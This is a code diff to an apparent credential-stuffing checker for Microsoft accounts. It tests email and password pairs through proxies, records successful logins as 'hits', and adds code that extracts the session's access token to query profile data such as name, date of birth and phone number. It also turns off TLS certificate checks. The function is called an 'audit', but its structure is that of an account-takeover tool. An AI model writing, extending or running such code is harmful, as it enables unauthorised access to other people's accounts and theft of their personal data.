@@ -272,6 +272,23 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
 
         if "kmsi" in res2.url.lower() or "kmsi" in res2.text.lower() or "oauth2" in res2.url.lower():
             # ¡HITS POSITIVO!
+            
+            # --- EXTRACT ACCESS TOKEN FOR GRAPH API ---
+            access_token = None
+            if "access_token=" in res2.url:
+                m = re.search(r'access_token=([^&]+)', res2.url)
+                if m: access_token = m.group(1)
+            elif "access_token" in res2.text:
+                m = re.search(r'"access_token"\s*:\s*"([^"]+)"', res2.text)
+                if m: access_token = m.group(1)
+                
+            api_headers = {
+                "User-Agent": "Mozilla/5.0",
+                "Accept": "application/json"
+            }
+            if access_token:
+                api_headers["Authorization"] = f"Bearer {access_token}"
+
             profile_res = session.get("https://login.microsoftonline.com/consumers/profile/v1.0/me", verify=False, timeout=15)
             country = "XZ"
             name, dob, language, phone = "N/A", "N/A", "N/A", "N/A"
